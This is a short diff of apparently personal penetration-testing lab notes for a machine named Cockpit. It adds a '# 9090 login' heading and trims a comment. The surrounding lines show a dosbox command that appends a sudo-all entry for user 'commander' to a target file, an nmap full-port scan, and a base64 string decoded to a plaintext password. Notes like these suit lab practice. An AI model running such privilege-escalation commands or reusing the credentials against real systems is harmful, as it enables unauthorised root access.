@@ -367,7 +367,7 @@ dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
 
 ### Cockpit
 ```shell
-# port scan / 9090 레빗홀
+# port scan 
 sudo nmap -sC -sV -Pn -p- 192.168.231.10 -oN 231.10_allport
 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
 |_http-server-header: Apache/2.4.41 (Ubuntu)
@@ -386,6 +386,9 @@ canttouchhhthiss@455152
 ## cameron
 echo "dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy" | base64 -d
 thisscanttbetouchedd@455152
+
+# 9090 login
+
 
 ```
 
